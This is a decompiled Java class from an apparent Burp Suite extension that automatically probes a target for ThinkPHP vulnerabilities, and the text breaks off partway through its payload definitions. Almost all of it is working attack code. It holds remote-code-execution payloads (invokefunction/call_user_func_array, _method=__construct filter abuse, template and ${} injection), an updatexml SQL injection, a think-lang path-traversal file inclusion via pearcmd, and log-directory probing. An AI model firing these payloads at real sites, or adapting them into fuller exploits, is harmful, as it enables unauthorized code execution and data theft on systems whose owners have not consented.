/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package burp.ScanFun;

import burp.BurpExtender;
import burp.Common;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import java.io.PrintWriter;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class ThinkphpScan {
    static PrintWriter stdout;
    public static String[] payloadsTP5_1;
    public static String payloadsTP5_2;
    public static String payloadsTP5_3;
    public static String payloadsTP5_4;
    public static String payloadsTP5_5;
    public static String payloadsTP2;
    public static String payloadsTP51_1;
    public static String payloadTP5_6;
    public static String payloadsTP5_7;
    public static String payloadsTP5_8;
    public static String payloadsTP5_9;
    public static String payloadsTP5_10;
    public static String payloadsTP5_sqli1;
    public static String payloadsTP_unknow_1;
    public static String payloadsTP_unknow_2;
    public static String payloadsTP3_1;
    public static String payloadsTP3_2;
    public static String payloadTP_lang_lfi;
    public static String payloadsTP5InfoLeak;
    public static String[] payloadsTP_logs;

    public static IHttpRequestResponse ThinkphpScanRCE(IHttpRequestResponse basereqres, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, String custompath) {
        URL url = helpers.analyzeRequest(basereqres).getUrl();
        for (String payload : payloadsTP5_1) {
            List<String> headers = helpers.analyzeRequest(basereqres).getHeaders();
            headers.set(0, "GET " + custompath + "/" + payload + " HTTP/1.1");
            byte[] body = helpers.buildHttpMessage(headers, null);
            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
            String res = Common.getResbody(requestResponse.getResponse(), helpers);
            if (!res.contains("PHP Version")) continue;
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        List<String> headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadsTP2 + " HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        String res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadsTP3_1 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        SimpleDateFormat df = new SimpleDateFormat("yy_MM_dd");
        String date = df.format(new Date());
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadsTP3_2.replace("22_11_30", date) + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadsTP3_1 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        df = new SimpleDateFormat("yy_MM_dd");
        date = df.format(new Date());
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadsTP3_2.replace("22_11_30", date) + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadTP5_6 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadsTP51_1 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadsTP_unknow_1 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadsTP_unknow_2 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/?s=index/index HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_2.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/index.php?s=index HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_3.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/ HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_4.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/ HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_9.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/?s=captcha HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_5.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/?s=captcha HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_7.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/?s=captcha HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_10.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/?s=index/index/index HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_8.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        for (String payload : payloadsTP5_1) {
            headers = helpers.analyzeRequest(basereqres).getHeaders();
            headers.set(0, "GET " + custompath + "/public/" + payload + " HTTP/1.1");
            body = helpers.buildHttpMessage(headers, null);
            requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
            res = Common.getResbody(requestResponse.getResponse(), helpers);
            if (!res.contains("PHP Version")) continue;
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadsTP2 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadTP5_6 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadsTP51_1 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadsTP_unknow_1 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadsTP_unknow_2 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/public/?s=index/index HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_2.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/public/index.php?s=index HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_3.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/public/ HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_4.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/public/ HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_9.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/public/?s=captcha HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_5.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/public/?s=captcha HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_7.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/public/?s=captcha HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_10.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST " + custompath + "/public/?s=index/index/index HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        body = helpers.buildHttpMessage(headers, payloadsTP5_8.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadsTP5_sqli1 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("XPATH syntax error")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadsTP5InfoLeak + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.length() < 15 && helpers.analyzeResponse(requestResponse.getResponse()).getStatusCode() == 200) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadsTP5_sqli1 + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("XPATH syntax error")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadsTP5InfoLeak + " HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.length() < 15 && helpers.analyzeResponse(requestResponse.getResponse()).getStatusCode() == 200) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/" + payloadTP_lang_lfi + " HTTP/1.1");
        headers.add("think-lang: ../../../../../../../../../../../../../../usr/local/lib/php/pearcmd");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/ HTTP/1.1");
        headers.add("think-lang: ../../../../../../../../../../../../../../tmp/a03dd2e5b");
        body = helpers.buildHttpMessage(headers, null);
        IHttpRequestResponse requestResponse_tmp = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse_tmp.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            stdout.println(e.getMessage());
        }
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/" + payloadTP_lang_lfi + " HTTP/1.1");
        headers.add("think-lang: ../../../../../../../../../../../../../../usr/local/lib/php/pearcmd");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "GET " + custompath + "/public/ HTTP/1.1");
        headers.add("think-lang: ../../../../../../../../../../../../../../tmp/a03dd2e5b");
        body = helpers.buildHttpMessage(headers, null);
        requestResponse_tmp = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse_tmp.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        BurpExtender.scannedDomainURL_thinkphp_rce.add(url.getHost() + ":" + url.getPort());
        return null;
    }

    public static IHttpRequestResponse ThinkphpScanLog(IHttpRequestResponse basereqres, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, String custompath) {
        URL url = helpers.analyzeRequest(basereqres).getUrl();
        for (int i = 0; i < payloadsTP_logs.length; ++i) {
            String path = payloadsTP_logs[i];
            List<String> headers = helpers.analyzeRequest(basereqres).getHeaders();
            headers.set(0, "GET " + custompath + path + " HTTP/1.1");
            byte[] body = helpers.buildHttpMessage(headers, null);
            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
            List<String> resp_headers = helpers.analyzeResponse(requestResponse.getResponse()).getHeaders();
            if (helpers.analyzeResponse(requestResponse.getResponse()).getStatusCode() == 301) {
                for (int j = 0; j < resp_headers.size(); ++j) {
                    if (!resp_headers.get(j).contains(path + "/")) continue;
                    BurpExtender.scannedDomainURL_thinkphp_log.add(url.getHost() + ":" + url.getPort());
                    return requestResponse;
                }
            }
            try {
                Thread.currentThread();
                Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
                continue;
            } catch (InterruptedException e) {
                stdout.println(e.getMessage());
            }
        }
        BurpExtender.scannedDomainURL_thinkphp_log.add(url.getHost() + ":" + url.getPort());
        return null;
    }

    static {
        payloadsTP5_1 = new String[]{"?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1", "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1", "?s=index|think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=-1"};
        payloadsTP5_2 = "_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo";
        payloadsTP5_3 = "s=1&_method=__construct&method=&filter[]=phpinfo";
        payloadsTP5_4 = "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=-1";
        payloadsTP5_5 = "_method=__construct&filter[]=phpinfo&method=get&get[]=-1";
        payloadsTP2 = "?s=/index/index/name/${@phpinfo()}";
        payloadsTP51_1 = "?s=index/\\think\\Request/input&filter=phpinfo&data=1";
        payloadTP5_6 = "?s=index/\\think\\View/display&content=\"<?><?php phpinfo();?>&data=";
        payloadsTP5_7 = "_method=__construct&filter[]=call_user_func_array&method=get&server[REQUEST_METHOD]=phpinfo";
        payloadsTP5_8 = "s=phpinfo&_method=__construct&method&filter[]=call_user_func_array";
        payloadsTP5_9 = "c=call_user_func_array&f=phpinfo&_method=filter";
        payloadsTP5_10 = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=-1";
        payloadsTP5_sqli1 = "?ids[0,updatexml(0,concat(0xa,user()),0)]=1";
        payloadsTP_unknow_1 = "?s=index/\\think\\Module/Action/Param/${@phpinfo()}";
